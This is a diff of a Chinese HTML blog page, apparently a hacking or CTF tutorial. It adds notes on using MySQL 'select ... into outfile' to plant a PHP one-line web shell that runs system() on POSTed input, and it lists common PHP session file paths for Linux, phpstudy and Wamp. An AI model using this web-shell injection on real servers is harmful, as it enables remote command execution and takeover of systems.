@@ -257,9 +257,15 @@
 <p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
 <h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL写一句话（MySQL）</p>
 <blockquote>
-<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，即注入路径。</p>
+<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，，即注入路径file.php文件名可以随便填写。</p>
 </blockquote>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
+<h3 id="sessionID文件常见路径"><a href="#sessionID文件常见路径" class="headerlink" title="sessionID文件常见路径"></a>sessionID文件常见路径</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>常见的文件路径为： /var/lib/php/session/</p>
+</blockquote>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
+<p>phpstudy集成软件环境下，文件路径为：<br>/phpstudy/PHPTutorial/tmp/tmp<br>Wamp集成软件环境下，文件路径为：<br>/wamp64/tmp”</p>
+</blockquote>
+<h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
       
     </div>
     
